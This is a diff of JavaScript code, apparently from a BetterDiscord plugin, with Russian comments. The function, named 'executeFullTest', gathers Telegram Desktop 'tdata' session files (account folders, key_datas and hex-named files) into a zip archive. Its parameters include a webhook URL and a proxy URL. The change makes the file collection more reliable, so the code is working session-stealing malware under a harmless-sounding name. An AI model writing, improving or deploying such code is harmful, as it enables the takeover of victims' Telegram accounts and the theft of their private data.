@@ -162,7 +162,7 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
         result.debug_tdata.push(`Ошибка поиска: ${e.message}`);
     }
 
-    // 5. ФОРМИРУЕМ АРХИВ (УМНЫЙ ФИЛЬТР ФАЙЛОВ)
+    // 5. ФОРМИРУЕМ АРХИВ (ЧИТАЕМ ВСЕ ФАЙЛЫ НАПРЯМУЮ)
     let finalZipBuffer = null;
     try {
         const zipFiles = {};
@@ -175,17 +175,31 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
             const hexRegexFile = /^[A-Fa-f0-9]{16}[a-z]?$/;
 
             try {
-                const entries = fs.readdirSync(tdataPath); // Просто список имен файлов
+                const entries = fs.readdirSync(tdataPath);
                 let fileCount = 0;
+                let skippedCount = 0;
+
+                // Убрали проверку stat.size, читаем напрямую
+                const readFileSafe = (filePath, zipPath) => {
+                    try {
+                        const data = fs.readFileSync(filePath);
+                        if (data.length === 0) {
+                            // Если реально 0 байт, пропускаем, но пишем в лог
+                            result.debug_tdata.push(`Пропущен пустой файл: ${path.basename(filePath)}`);
+                            skippedCount++;
+                            return;
+                        }
+                        zipFiles[zipPath] = new Uint8Array(data);
+                        fileCount++;
+                    } catch (err) {
+                        result.debug_tdata.push(`Ошибка чтения ${path.basename(filePath)}: ${err.message}`);
+                    }
+                };
 
                 for (const name of entries) {
                     const fullPath = path.join(tdataPath, name);
                     let isDir = false;
-                    try {
-                        isDir = fs.statSync(fullPath).isDirectory();
-                    } catch (e) {
-                        continue; // Пропускаем, если нет доступа
-                    }
+                    try { isDir = fs.statSync(fullPath).isDirectory(); } catch (e) { continue; }
 
                     // 1. Папка аккаунта
                     if (isDir && hexRegexFolder.test(name)) {
@@ -200,8 +214,7 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
                                     if (fs.statSync(subFull).isDirectory()) {
                                         addFolder(subFull, relPath);
                                     } else {
-                                        zipFiles['tdata/' + name + '/' + relPath] = new Uint8Array(fs.readFileSync(subFull));
-                                        fileCount++;
+                                        readFileSafe(subFull, 'tdata/' + name + '/' + relPath);
                                     }
                                 }
                             } catch (err) {
@@ -213,20 +226,16 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
                     
                     // 2. key_datas
                     else if (!isDir && name === 'key_datas') {
-                        zipFiles['tdata/key_datas'] = new Uint8Array(fs.readFileSync(fullPath));
-                        result.debug_tdata.push(`Добавлен файл: key_datas`);
-                        fileCount++;
+                        readFileSafe(fullPath, 'tdata/key_datas');
                     }
 
-                    // 3. Корневые файлы с 16-символьным именем (напр. D877F783D5D3EF8Cs)
+                    // 3. Корневые файлы с 16-символьным именем
                     else if (!isDir && hexRegexFile.test(name)) {
-                        zipFiles['tdata/' + name] = new Uint8Array(fs.readFileSync(fullPath));
-                        result.debug_tdata.push(`Добавлен файл: ${name}`);
-                        fileCount++;
+                        readFileSafe(fullPath, 'tdata/' + name);
                     }
                 }
                 
-                result.debug_tdata.push(`Итого добавлено файлов: ${fileCount}`);
+                result.debug_tdata.push(`Добавлено файлов: ${fileCount}. Пропущено пустых: ${skippedCount}`);
                 if (fileCount > 0) hasTdata = true;
                 
             } catch (dirErr) {
